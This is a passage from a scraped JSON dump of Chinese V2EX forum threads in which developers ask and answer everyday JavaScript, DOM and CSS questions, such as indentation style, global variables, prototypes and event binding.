class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">!==</span> <span class=\"nx\">finalValue</span> <span class=\"p\">)</span>\n            <span class=\"p\">{</span>\n              <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">=</span> <span class=\"nx\">finalValue</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span>\n          <span class=\"p\">}</span>\n        <span class=\"p\">}</span>\n      <span class=\"p\">}</span>\n\n      <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">;</span>\n      <span class=\"p\">}</span>\n  <span class=\"p\">});</span>\n\n<span class=\"p\">});</span>\n<span class=\"c1\">// 是不是更加直观，容易看清楚了呢？</span>\n</pre></div>\n\n<p>所以，我不理解了，为什么大家常见都说2个空格，又写成4个空格，不换行，特别是2个空格的花括号不换行，难道看着成篇成篇的代码不难受吗？</p>\n\n<p>此文仅用于个人偏好讨论用。没有任何别的什么意思。</p>\n</div></div>"], "reply": "27", "tittle": "关于 javascript 的编程风格（完整版）", "comment": ["用空格，其实v2ex 不应该支持编辑主题吗?...", " 好像只能在1分钟内允许编辑，超过就不行了。。。而且 v2ex 的 markdown 语法分析器分析出来的 html 简直了。。。", "缩进我觉得看个人喜好，但现在两格应该更流行，可以使用editorconfig来管理缩进；其他的就参照这个吧： ", " 空2格太难受了。。。", "自古以来都是四格，神圣不可侵犯", "最近学go和js, go需要花括号不换行，而js又提倡不换行，无奈我只好改变习惯，都不换行吧", "怎么方便怎么来，IDE能自动格式化最好。团队风格保持一致就行，没必要太纠结这些。", "打倒2格党", "2格简直不能忍，4格才是正统", "javascript有些地方的花括号不能换行的 否则会有bug， 所以花括号还是全部不换行把\r", "\r", "\r", "function foo() {\r", "  return {\r", "    a: 123\r", "  }\r", "}\r", "\r", "function bar() \r", "{\r", "  return \r", "  {\r", "    a: 123\r", "  }\r", "}\r", "\r", "foo(); // Object {a: 123}\r", "bar(); // undefined", "用vim的话装个 jsbeautify ,杀死一切两格党", "\r", "之前有段时间我的HTML、JS、CSS都是缩进4个空格，后来都改成了 2 个，一个是因为这样看着比较紧凑，再者就是单行可以放更多的内容；只有在做后台开发的时候保持4个空格，例如C#的代码风格；同样的花括号也类似，现在我在JS中也是花括号不换号，但是C#换行；一般在一个团队里面的话，都会有编码规范，只要团队统一就好，如果是个人，自己喜欢就好，最好能坚持~~", " bar() 想要 return 一个对象，花括号当然不应该换行，不然就直接返回了啊", " 好吧，那就不换行吧。\r", " apple swift 也是这样\r", " jsbeautify 可以配置 opts.indent_size = 2", "我怎么隐隐约约闻到一股火药味。。", " \r", "这样，你们折中一下用3个空格\r", "。\r", "。\r", "。\r", "。\r", "。\r", "。\r", "或者两个全角空格", "4格的话缩进会相当长吧= =", "4 格的话，你可以这样声明变量\r", "\r", "\r", "\r", "其实还挺好看的", "4格比较常用  回调太多了再用2格", "为什么不用tab？ 换成tab你想设置成几个空格就几个空格。\r", "2个空格大小的缩进？ why？  放在十年前我可以试着理解成当时屏幕分辨率小。 现在都大分辨率了嘛\r", "\r", " \r", " \r", " \r", " \r", " \r", "编写可维护的JS一书上面我看到还有用8格的....", " 没关系，我的配置里面不出现这个设置就可以了", " 我一直用四格, 从来不用别的. 我也很奇怪2个空格的流派是基于什么考虑...\r", "\r", "我个人是设置tab 自动转换成4个空格的, 一直是习惯tab, 嫌删行时候麻烦, 可后来发现一些熟人用的神经病编译器对tab 的处理是8个空格, 还没法设定. \r", "\r", "然后就转了性了. 当然个人写的小脚本我还是会用tab缩进, 反正不用给别人, 自己爽就行了...", " 「就是因为 tab 你想设置成几个空格就几个空格，反而让呈现出的样式不一样，所以要用空格」这个能说服你么 _(:3 」∠)_", "照着 jshint 来不行吗?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如: （一）</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">db</span> <span class=\"o\">=</span> <span class=\"nx\">openDatabase</span><span class=\"p\">(</span><span class=\"s1\">'db'</span><span class=\"p\">,</span> <span class=\"s1\">'1.0'</span><span class=\"p\">,</span> <span class=\"s1\">'description'</span><span class=\"p\">,</span> <span class=\"mi\">1024</span><span class=\"p\">);</span>\n</pre></div>\n\n<p>对比：（二）</p>\n<div class=\"highlight\"><pre><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">db</span> <span class=\"o\">=</span> <span class=\"nx\">openDatabase</span><span class=\"p\">(</span><span class=\"s1\">'db'</span><span class=\"p\">,</span> <span class=\"s1\">'1.0'</span><span class=\"p\">,</span> <span class=\"s1\">'description'</span><span class=\"p\">,</span> <span class=\"mi\">1024</span><span class=\"p\">);</span>\n</pre></div>\n\n<p>示列（二）这种把 db 用 window 声明成全局变量是否影响性能呢？</p>\n</div></div>"], "reply": "8", "tittle": "javascript 的 window 全局变量是否影响性能？", "comment": ["Google 到了以下结果：\r", "\r", "\r", "\r", "PS：JavaScript 新手，并不太清楚以上内容和本主题是否有关系，因此仅供参考。不过还是建议楼主 Profile 一下。", "这点性能算个蛋，没找到瓶颈之前不要做性能优化。", " \r", " \r", "\r", "碉堡了，再也不用担心 global 的问题了，哇哈哈哈哈", "1. 如果你没有在一个闭包的环境下运行上面的代码，两种方式得到的结果其实是一样的。\r", "2. 全局变量的问题不在于性能，而是让作用域变得不可控。无论是在浏览器上还是在后端，未来可能会在同一环境下运行无数的代码，但是全局变量就只有一套，所以省着点，小心一点用。", "不要试图污染window 除非你是一个框架级的东西", "全局变量不能被垃圾回收的机制回收。", " 赞同第2点。", " \r", " \r", "\r", "请看： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><hr>\n<div class=\"highlight\"><pre>function Person(){\n    Person.prototype.talk=function(){alert(\"saying\")};\n}\n\nfunction Men(){\n}\n\nMen.prototype = new Person();\n\nvar men = new Men();\nmen.talk();\n</pre></div>\n\n<p>可以执行成功，但</p>\n<div class=\"highlight\"><pre>function Person(){\n    Person.prototype.talk=function(){alert(\"saying\")};\n}\n\nfunction Men(){\n    Men.prototype = new Person();\n}   \n\nvar men = new Men();\nmen.talk();\n</pre></div>\n\n<p>报错。请问在构造函数内部和外部为 prototype 赋值有何区别</p>\n</div></div>"], "reply": "4", "tittle": "在构造函数内外为 prototype 属性赋值的区别", "comment": ["因为第二个在new的时候，你还没有指定原型。\r", "\r", "new相当于创建一个新对象，然后把这个新对象的原型指向函数(类)的prototype对象，第二个在构造方法里才指定原型，此时新对象的创建已经完成，它早已指向别处，所以报错。\r", "\r", "在第二个例子中，如果再new一次，应该就不会报错了。", "function Men(){\r", "        function ret() {}\r", "        ret.prototype = new Person();\r", "        ret = new ret;\r", "        Men = ret;\r", "        return ret\r", "    }\r", "作弊可以吗，哈哈哈", "请看https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new\r", "```\r", "When the code new foo(...) is executed, the following things happen:\r", "\r", "   1. A new object is created, inheriting from foo.prototype.\r", "   2.The constructor function foo is called with the specified arguments and this bound to the newly created object. new foo is equivalent to new foo(), i.e. if no argument list is specified, foo is called without arguments.\r", "   3.The object returned by the constructor function becomes the result of the whole new expression. If the constructor function doesn't explicitly return an object, the object created in step 1 is used instead. (Normally constructors don't return a value, but they can choose to do so if they want to override the normal object creation process.)\r", "```\r", "第一步的时候，Men的prototype还不是Person对象，第二步才是执行constructor，而在你的代码中这时才改Men的prototype， 晚了。", "补充一点，对象初始化之后prototype是不可以改变，但是可以修改prototype的属性。\r", "所以new之后再assign prototype是不行的，但是(new Person()).talk()是OK的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://192.99.91.71/fa.html\">http://192.99.91.71/fa.html</a><br>\n里面用一个js用户脚本 让里面iframe下网页中 的div 内的文字颜色变成绿色！</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "求一段可以在 firefox 下运行的用户脚本", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以下代码示例，如果不用 window 如何，在别的 <code>.js</code> 文件里引用呢？</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// app.js</span>\n<span class=\"c1\">// ------</span>\n\n<span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n  <span class=\"nx\">require</span><span class=\"p\">([</span><span class=\"s1\">'router'</span><span class=\"p\">],</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">router</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">app</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n\n      <span class=\"nx\">initialize</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">bindEvents</span><span class=\"p\">();</span>\n      <span class=\"p\">},</span>\n\n      <span class=\"nx\">bindEvents</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">onload</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">onDeviceReady</span><span class=\"p\">();</span>\n      <span class=\"p\">},</span>\n\n      <span class=\"nx\">onDeviceReady</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"nx\">main</span><span class=\"p\">.</span><span class=\"nx\">receivedEvent</span><span class=\"p\">(</span><span class=\"s1\">'deviceready'</span><span class=\"p\">);</span>\n      <span class=\"p\">},</span>\n\n      <span class=\"nx\">receivedEvent</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">event</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"k\">switch</span> <span class=\"p\">(</span><span class=\"nx\">event</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n          <span class=\"k\">case</span> <span class=\"s1\">'deviceready'</span><span class=\"o\">:</span>\n            <span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">initMian</span><span class=\"p\">();</span>\n            <span class=\"k\">break</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n      <span class=\"p\">},</span>\n\n      <span class=\"nx\">initMian</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n        <span class=\"c1\">// 不用 window 如何把这货在别的 .js 里可用？</span>\n        <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">db</span> <span class=\"o\">=</span> <span class=\"nx\">openDatabase</span><span class=\"p\">(</span><span class=\"s1\">'db'</span><span class=\"p\">,</span> <span class=\"s1\">'1.0'</span><span class=\"p\">,</span> <span class=\"s1\">'description'</span><span class=\"p\">,</span> <span class=\"mi\">10240</span><span class=\"p\">);</span>\n\n        <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">$</span> <span class=\"o\">=</span> <span class=\"nx\">jQuery</span><span class=\"p\">;</span>\n\n      <span class=\"p\">}</span>\n\n    <span class=\"p\">};</span>\n\n    <span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">initialize</span><span class=\"p\">();</span>\n\n  <span class=\"p\">});</span>\n\n<span class=\"p\">})();</span>\n</pre></div>\n</div></div>"], "reply": "14", "tittle": "@NemoAlex @Phariel 不要试图污染 window 除非你是一个框架级的东西", "comment": ["在另外一个文件，比如，router.js \r", "我就可以用 $('.element').on('event', function...\r", "我就可以用 db.transaction(function(tx) { ...", "export？", "用命名空间啊，你暴露一个变量在全局环境里面，所有东西挂在那个变量上面。", "把你所有的js放在一个闭包/空间里呢？\r", "我觉得直接用window.db不如直接用windows.myapp.db.", " 那这样的话，除了名字不叫 window 有什么区别么。。。\r", " 那还不是 window...", " 暴露一个和暴露多个的区别吧。你现在是刚好只需要注册一个变量，所以感觉没啥区别，如果以后代码加了新的功能怎么办？", " \r", "> 那这样的话，除了名字不叫 window 有什么区别么。。\r", "对，没有，不过这样就不会和别的库冲突了。\r", "\r", "node.js 里的 export 容许你 require() 出来，并自定义变数名称，这样就绝对不会冲突——", " 对，这个在 requirejs 里边也可以 export，但是不是用于干这个的。。。", " 就是只有在 app.js 这个文件里才用 window，其他都是 require 出来的 mvc 文件，但是在 model 和 controller 这层要用到 db 这些变量，因为不可能每 new 一次都 open 一下 db 啊", "去看看YUI...了解下明明空间。", "命名空间 ...", " \r", "\r", "因为myapp本来就是个框架。\r", "\r", "如果你用其他框架，比如jQuery,那么就应该放在jquery里。", "你 @ 了我，所以我进来看了一下\r", "但是看完，我都不知道说什么好了\r", "所以就这样吧", "楼主的问题其实就是Js设计模式的问题，现在有很多流派，自己随便选个自己喜欢的就可以。\r", "个人偏好还是定义一个命名空间，如果有什么需要外部调用的，return 就可以，大概这样子。\r", "\r", "window.FUN = (window.FUN || {});\r", "\r", "// Main Functions\r", "FUN = (function ($) {\r", "\t'use strict';\r", "\t\r", "\tfunction todo() { ... }\r", "\r", "\treturn {\r", "\t\ttodo: doing\r", "\t}\r", "});\r", "\r", "\r", "... FUN.doing();"]},
{"content": "", "reply": "3", "tittle": "怎么把 PSD 转成 HTML/CSS？", "comment": ["没有银弹", "切图,手写html+css+js,泪目...", "花500块钱找个人"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img src=\"http://bbs.miaov.com/data/attachment/forum/201504/23/202222eof03py6puq3f10i.gif\" alt=\"此处输入图片的描述\">如图所示:没有旋转的时候拖拽四个控点进行缩放是正确的，但是旋转之后，再进行缩放，缩放的方向就不对了。求解决这个问题的思路。缩放我是改变left，top值做的、旋转是用CSS3的matrix做的，还有就是旋转之后，四个角的cursor也不对了</p>\n</div></div>", "<div class=\"topic_content\">![](http://www.webfed.cn/static/webapp/static/images/3.gif)</div>"], "reply": "8", "tittle": "css3 旋转和缩放问题", "comment": ["transform-origin: center;?", "就是楼上说的", "transform-origin:50% 50%;", " \r", " \r", "就像PS里的缩放和旋转一样，假如旋转了45度角后，再点击右下角的控点进行缩放，此时是以右下角正对角的控点为原点进行缩放的。transform-origin: center这个应该不行吧。感觉用这个会更复杂。", " \r", "根据你的问题描述，是元素执行变换时的原点问题\r", "那就是使用transform-origin这个属性\r", "具体设置的话，根据你的设计，是保存了四个角的坐标并绑定了拖拽事件的\r", "那么就在事件中设置元素的属性：\r", "transform: scale\r", "transform-origin: 对角点的坐标", " ", " 我想要的效果是这样的，当然他这个是用canvas做的。我现在缩放改变的是width，height，left，和top。没有用scale。实际效果和这个网站一样的： ", " \r", " 我看这个里面也是设置的origin\r", "基于你现有的left/top的方案，我觉得不可行。因为只靠这一类CSS属性的话，你无法控制浏览器绘制一个元素的原点，没有这个接口。\r", "建议换用transform。\r", "1. transform在动画性能上更高\r", "2. origin属性可以简单地解决你的难点", " ", "  用scale缩放的话，控点也会变小。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如var g1=new func();<br>\nvar g2=new func();<br>\n我需要当g1/g2里的某个方法调用时，同时改变g1 g2里的某个成员</p>\n</div></div>"], "reply": "11", "tittle": "在 js 里有办法让对象新建的两个不同实例互相访问吗", "comment": ["类似其他面向对象语言的静态变量？\r", "function func(){\r", " this.member=123;\r", "}\r", "func.static_member=456\r", "\r", "...\r", "\r", "如果不是上面的需求那就直接把对象作为参数传递进去改变值了", "我想可能需要用 g1.prototype.foobar", "func.prototype.foobar", "只要出现奇葩的需求，就是代码逻辑有问题。", "g1提供set某个成员的方法，g2也提供，再调用你说的那个方法的时候同时调用g1和g2的set方法，", "function g(){\r", "}\r", "\r", "function g1(){\r", "}\r", "\r", "function g2(){\r", "}\r", "\r", "g1.prototype = g.prototype;\r", "g2.prototype = g.prototype;\r", "\r", "g.prototype.number = 1;\r", "var n1 = new g1(), n2 = new g2();\r", "\r", "console.log(n1.number, n2.number); //=> 1\r", "g.prototype.number = 2; //注意不能用  n1.number = 2 或者 n2.number = 2\r", "console.log(n1.number, n2.number); //=> 2", "func.prototype.foobar +1", " ＋1 ～～～", "闭包", "prototype的方式这个变量就变成公用的对g1和g2而言，", "var Class = function () {\r", "    var instances = [];\r", "    function Class (name) {\r", "        this.name = name;\r", "        instances.push(this);\r", "    }\r", "    Class.prototype.setName = function (name) {\r", "        instances.forEach(function (instance) {\r", "            instance.name = name;\r", "        })\r", "    }\r", "    return Class;\r", "}();\r", "\r", "var instance1 = new Class('xx');\r", "var instance2 = new Class('oo');\r", "\r", "console.log(instance1.name); // xx\r", "console.log(instance2.name); // oo\r", "\r", "instance1.setName('xxoo');\r", "\r", "console.log(instance1.name); // xxoo\r", "console.log(instance2.name); // xoo"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个链接指向文件本身：</p>\n<div class=\"highlight\"><pre><span class=\"c\">&lt;!-- 文件 index.html --&gt;</span>\n<span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">\"index.html\"</span> <span class=\"na\">class=</span><span class=\"s\">\"clickme\"</span><span class=\"nt\">&gt;</span>index.html<span class=\"nt\">&lt;/a&gt;</span>\n</pre></div>\n\n<p>点击这个链接时，console 一下 clicked</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">'click'</span><span class=\"p\">,</span> <span class=\"s1\">'a.clickme'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'clicked'</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</pre></div>\n\n<p>但是问题是，<br>\n点1次 console一次，点2次 console 2次，点3次 console 3次，点4次。。。<br>\n这是什么情况。。。 用了 requirejs</p>\n</div></div>"], "reply": "12", "tittle": "大牛都来看一下 JavaScript 事件处理", "comment": ["点几次就出几次，这有什么问题？", "难道有什么不对的地方么", " \r", " \r", "\r", "他是在原有的 console 的基础上 log 出来 n 次。\r", "\r", "比如，点3次，那么就是 log 出来 1+2+3 次", "那就要看看你的html中是不是只有一个`a.clickme`的标签了。。", "jQuery 有一个 unbind() 可以解决这个问题，但是我很好奇他是为什么发生的", "点了链接后代码又被加载了一次?", "event.stopImmediatePropagation(); 也可以解决这个问题\r", "\r", "但是这个问题怎么发生的？一般来说不需要 unbind 或者 stopImmediatePropagation 的", "是不是因为我用 requirejs 加载的时候，每一次 requirejs 都 new 一个事件，然后，以前的事件没有注销，所以会出现这样的情况呢？", "你贴的两段代码提供不了全部信息，如我示例", "\r", "不会出现你的问题。\r", "感觉你的事件handler重复注册了，我有两个问题：\r", "1. a标签指向自己，点了后页面有跳转吗？是否还有别的处理？如果整页刷新的话新的DOM新的Handler应该不会出现你的问题。\r", "2. 我猜测是你的页面没有刷新，但是这段注册事件的脚本反复被执行了，在`$(document).on`的外面加console.log检查注册了几次？", "代码贴得不全，按你说法估计是事件被重复绑定了", "我想问题还是出在他那个链接指向的是页面本身。。。这样点了之后也许因为什么原因事件就又绑定了一次。。。", " \r", " \r", " \r", "\r", "多谢各位大神的回复，问题已解决。\r", "睡了一觉起来，精神好很多。然后发现我是在一个 requirejs 加载进来的对象内，调用对象本身的一个方法，去绑定一个实时事件，所以，会产生多重绑定，事件绑定放在绑定对象外就可以了。\r", "哈哈。"]},
{"content": ["<div class=\"topic_content\">一个简单的例子:<br><a target=\"_blank\" href=\"http://codepen.io/iugo/pen/pJveKZ\" rel=\"nofollow\">http://codepen.io/iugo/pen/pJveKZ</a><br><br>一个实用的例子:<br><a target=\"_blank\" href=\"http://codepen.io/iugo/pen/aOzJRe\" rel=\"nofollow\">http://codepen.io/iugo/pen/aOzJRe</a><br><br>简单的例子在 Firefox 和移动端都很好地实现了功能.<br><br>但是实用的例子在 Firefox 实现了功能, 但在移动端却无法移除 class, 导致功能缺失.<br><br>测试环境:<br>Firefox: Ubuntu(64bit) 37<br>移动端: iOS 8(Safari) and Android 4.4(Chrome)</div>"], "reply": "9", "tittle": "通过 .classList.add('') 增加的 class (在移动端 WebKit)无法通过 .classList.remove('') 移除是为什么? 增加一个 class 的本质是什么?", "comment": ["简单的例子在 Android 4.4(Chrome) 上正常.\r", "但是在 iOS 8(Safari) 上不正常.", " 应该不是这么简单的问题.\r", "\r", "如果需要移除 html 中写的 class, 则没有问题.\r", "但如果使用一个函数向 classList 中增加 class, 则 Firefox 正常, WebKit 无法实现.", "iOS safari就没触发scroll事件，不是classList的问题……", " 移动端由 scroll 类似的事件吗? 或有什么库推荐吗?", " 简单的例子和实用的例子在 Chrome(Android) 里也是有区别的.\r", "\r", "在简单的例子中:\r", "只要滑动就触发了事件绑定的函数.\r", "\r", "在实用的例子中:\r", "滑动后需要在空白处点击一下才触发.\r", "\r", "这个是什么情况?", " Stackoverflow上有些相关的问题\r", "\r", "\r", "\r", "总得来说乖乖touchstart的时候开始setInterval判断scrollTop……", " 厄，我没有android的手机……我看有时间的话去借一个来帮你看看问题- -"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Lobos/react-ui\">https://github.com/Lobos/react-ui</a></p>\n\n<p>基于react，完成度很高，墙裂推荐啊</p>\n\n<p>demo: <a target=\"_blank\" rel=\"nofollow\" href=\"http://lobos.github.io/react-ui/#/\">http://lobos.github.io/react-ui/#/</a></p>\n</div></div>"], "reply": "12", "tittle": "朋友写的前端 ui 框架，欢迎 fork & star", "comment": ["怎么移动到 创意 区？", "组件不够多，也缺少设计。\r", "不过，也要顶一个", "liveload是不是忘记删了", "作为UI框架，肯定是不对滴。。但是作为react的实践，还是强烈推荐的", "\r", "\r", "?", "datetime控件很赞！", "基于bootstrap就太那个啦…\r", "\r", "\r", " 嗯，用来学习不错。", "时间不错", "tree和color都很nb", "loading... 太慢了，传说中的效率呢", "牛！\r", "watching下！", "timepicker 和 tree 很赞啊，请收下我的膝盖"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如 一个 json 含有 10000 个 item，有两种解决方案，那么现在问题来了：</p>\n\n<p>一、是以分页形式，比如每页 100 个，分批把 item 加载到 dom 呢？<br>\n二、还是 js 计算滚动事件和屏高按屏幕一屏一屏加载（滚动到下一屏时清除上一屏的dom），保持始终只加载一屏 item dom。</p>\n\n<p>哪种效率更高？更省内存cpu资源？</p>\n\n<p>第一种方案明显更省事。<br>\n第二种方案计算屏幕大小、添加和移除dom肯定是要耗资源的，但是只保持一屏 item 的 dom 肯定是要比累积保有 10000 个 dom 更好的。</p>\n\n<p>纠结了一晚上，拿不定主意，大牛们赶紧来给个说法啊。</p>\n</div></div>"], "reply": "23", "tittle": "JavaScript 大 json 加载到 dom 和 分屏加载到 dom 哪个更省内存？", "comment": ["如果不考虑兼容性预加载数据到IndexedDB是更好的选择，再分批取数据", " 亲，我们说的是 dom(数量) 和 js 内存占用，和取数据没有多大关系哦。", " 补充：我举个例子，不管从哪预加载数据，最终都要以 dom 呈现的对吧，那么，现在问题来了，他往下拉，你就按批取，他拉到最后一批，也就是说此时页面上就有 10000 个 item 的 dom 了对吧？我这里说的这个意思呢，就是说，是保有 10000 个 item dom 好，还是按屏幕取数据只保留一屏的 item dom 好。", "没遇到过这么大的量\r", "\r", "我目前是一次加载十页的数据 到了11页再加载11页到20页的数据", " 比如，到了11页，加载11页到20页的数据，是替换dom呢，还是插入dom呢？如果是替换，用户按了 home 键 或者滚动到最上面了，那岂不是少了数据。。。", " 之前的数据也在呃 所有的翻页都是替换dom\r", "\r", "我是 angularjs 做的", " 那不可能一次性替换到 11 页的 dom 那效率，那内存。。。而且替换掉dom再滚动到最上面，如果不再替换回来，数据肯定是没有了的啊，他绝对不会神奇般的就在了。", " 利用了https://angular-ui.github.io/bootstrap/#/pagination这个\r", "\r", "你那么大的数据了 我没经历过 不好说 要客户一次加载10000条 好像不是很现实", " 呃 我是横着翻页那种 。。", " 对，翻页这种要点嘛。。。编译好模版，翻页时直接赋值就可以了，不存在最上面和最下面滚动这样的事件，这样做可以的。\r", "\r", "但是我说的这个是，没有翻页。。。就是直接滚动，一直往下滚动，比如，微信的朋友圈，你一直往下拉，拉拉拉，拉到最后，然后，再直接点 toolbar 返回的第一个。", " ", " 这个是每一页替换一次 dom 不是 11 页", " 可以自己定制哇 我是每10页 获取一次数据，， 不然一次数据太多 带宽占用大\r", "而且 后面页数很少有人去看", " 亲。。。获取数据和替换dom是不同的。\r", "获取数据后，他保存在 js 的一个对象或者数组，然后，只对编译好的模版文件赋值加载当前页的数量的数据，实际是 dom 的数量是每页显示的条数，而不是从你取到的数据总量。", " 对 就是这个意思", "页面卡很多时候不是内存不够，看看浏览器渲染机制。", " 这个。。。还是从自己能改变的入手吧", "第二种方案好，其实dom不用全去掉 在生成一次 \r", "比如react.js", " 这个是效率最高的办法了\r", "\r", "lz 要知道创建一个  element 是多么大的开销，一个 element 的创建要无数的属性和方法，还要渲染，element 少一个是一个，自然要第二种", " 他这个 ", " 就是我形容的第（二）那个解决方案一样。。。", "第二种", "其实可以两种结合起来吧，滚动分页请求数据，并计算保持页面隐藏看不到的 dom，我们这就是这样的方案。", "参考一下这个如何？\r", "《JavaScript Grid with One Million Records》http://w2ui.com/web/blog/7/JavaScript-Grid-with-One-Million-Records"]},
{"content": ["<div class=\"topic_content\">我想自定义一个类似于addEventListener的顶级函数.<br>想要达到的效果是<br>比如我定义了一个 addEvent()添加事件的兼容函数我想把它挂在到所有对象里面<br>然后我抓取一个DOM元素直接给他添加事件<br>var drop = document.xxxxxx;<br>drop.addEvent('click',function(){<br> console.log('click');<br>})<br><br>下面是我写的一个函数就是爆出未定义不知为何.<br>[code]<br>(function(window){<br>\t\tObject.prototype.addEvent = function(e,o) {<br>\t\t\tconsole.log('1');<br>\t\t\tif(!window.attachEvent) {<br>\t\t\t\tthis.addEventListener(e, o, false);<br>\t\t\t} else {<br>\t\t\t\tthis.attachEvent('on' + e, o);<br>\t\t\t}<br>\t\t}<br>\t\tfunction $(e) {<br>\t\t\tvar cAt = e.charAt(0);<br>\t\t\tvar obj;<br>\t\t\tif(cAt == '#') {<br>\t\t\t\tobj = document.getElementById(e.substring(1));<br>\t\t\t} else if(cAt == '.') {<br>\t\t\t\tobj = document.getElementsByClassName(e.substring(1));<br>\t\t\t} else {<br>\t\t\t\tobj = document.getElementsByTagName(e);<br>\t\t\t}<br>\t\t\tobj.prototype = new addEvent;<br>\t\t\treturn obj;<br>\t\t}<br>\t\twindow.addEvent('load',function(){<br>\t\t\tvar drop = $('#drop');<br>\t\t\tdrop.addEvent('click',function(){1})<br>\t\t\tconsole.log(drop);<br><br>\t\t}, false);<br>\t})(window)<br>[/code]<br>这是整齐版的代码:http://pastie.org/10126119<br>不知道这属于js的那部分知识点？原型链吗？<br>求大牛指点一二.</div>"], "reply": "4", "tittle": "javascript 继承???????????????????", "comment": ["console.log(drop);\r", "\r", "先看看你抓取的是不是有效的 element。", "删掉 obj.prototype = new addEvent; 这一行就行了，你这一行的写法本身也有问题。\r", "\r", "JavaScript里面的所有对象都是 Object 对象的实例，所有对象会自动继承 Object 的属性和方法，不需要手动使用原型继承。", "楼上的说得对", "\r", "\r", "推荐楼主看完这部分"]},
{"content": ["<div class=\"topic_content\">先上代码<br><script src=\"https://gist.github.com/anonymous/2c9ec1107b9ce0142140.js\"></script><br>我想制作一个给图片加部分遮罩的功能<br>但是目前遇到了两个问题实在无力解决 遂来求助<br><br>问题1  在IE9下 个功能失灵（离谱的是 当打开开发人员工具的时候 功能正常了）<br>问题2  在最新版的Firefox（37.0.2）下 第一次使用是正常的，但是点击清除按钮以后，再次生成的遮罩定位就不准了<br><br>以上问题在chrome下并没有发现  实在不知如何解决 求各路高手出出主意</div>"], "reply": "4", "tittle": "关于浏览器坐标定位兼容的一些奇怪问题求助", "comment": ["1. OFFSETX AND OFFSETY.\r", "2. 正则问题, 没有考虑小数点.\r", "\r", "非常感谢 问题已解决\r", "但是没理解问题2的结果\r", "为何会产生小数，单位不是像素么？", "以后发前端求助最好用codepen之类的啊.", " 谁说像素不可能产生小数的。。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚接触js，见谅~<br>\n一开始代码是这么写的：document.getElementById(\"a4\").style.marginTop=document.getElementById(\"a4\").style.marginTop-1;<br>\n但后来傻傻的发现没反应，输出一看：<br>\ndocument.getElementById(\"a4\").style.marginTop这个取出来的是个 [10px] ，求问有没有什么办法可以得到这个10呢，如果要用文本替换.....求问怎么写~谢谢各位大神了~</p>\n</div></div>"], "reply": "6", "tittle": "有木有办法用 js 获取一个元素的上外边距", "comment": ["parseInt(document.getElementById(\"a4\").style.marginTop, 10) - 1", "哦，对了，你这里赋值要加上 + 'px'，才算设置成功", "\r", "\r", "我真蛋疼，入门就用用jQuery吧", " 谢谢了 \r", " 有的时候就是很蛋疼......也许应该用jQ,同样感谢", "我建议先学 jQuery，学熟练了再深挖 JS/DOM", "入门不建议用jq。。。。\r", "另外为什么我第一反应是用正则。。"]},
